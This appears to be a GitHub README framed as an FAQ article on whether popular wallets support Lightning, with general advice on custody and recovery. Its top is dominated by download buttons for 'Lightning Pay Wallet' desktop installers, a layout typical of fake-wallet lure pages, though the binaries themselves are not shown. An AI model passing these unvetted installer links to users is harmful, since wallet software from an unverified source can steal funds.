<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Does Trust Wallet, Exodus, Cake or Sparrow support Lightning?
Support changes between versions, so check the app rather than a list. Here is what to look for.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

People ask this because they already use one of these wallets and want to know whether it can pay a
Lightning invoice. The honest answer is that support varies by wallet, by version and sometimes by
platform, so the check belongs in the app rather than in an article.

## The check that always works

Open the wallet's receive screen and look for a Lightning option, or try to pay a small invoice. A
wallet that supports Lightning shows an invoice field, a channel or balance view, and a Lightning
address. A wallet that does not simply has no such screen, whatever a blog post says.

Version numbers matter more than brand names here: a wallet that added Lightning last year may have
had it removed, and a wallet that never had it may have shipped it since.

## The general picture

Wallets built around on-chain bitcoin, especially hardware-adjacent ones, tend to treat Lightning as a
separate concern and may not support it at all. Multi-asset wallets often do support it, and when they
do, the balance is usually custodial or held by a partner service.

That distinction is the one worth carrying away: "supports Lightning" does not mean "self-custodial
Lightning". A wallet can pay invoices while holding your keys for you, and the two properties are
independent.

## What to check before relying on it

Whether the keys are yours. Whether a recovery phrase restores the Lightning balance as well as the
on-chain one. Whether there is a channel view, because a wallet with no channel concept is holding your
balance for you.

This wallet's position is set out in
[what you actually hold in a Lightning wallet](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-you-hold-in-a-lightning-wallet.md).

## If your wallet does not support it

You can still hold bitcoin there and use a Lightning wallet for payments. Moving between them is an
on-chain transaction, which costs a fee and takes a confirmation. That is the normal arrangement rather
than a workaround.

## Questions people ask

### Do these wallets support Lightning today?

Check the installed version; it changes. This page will not guess at another product's current feature
set.

### Is Lightning support the same as self-custody?

No. Plenty of custodial wallets support Lightning.

### Can I send from one to the other?

If one side can produce an invoice or an address the other accepts, yes. The rails must match.
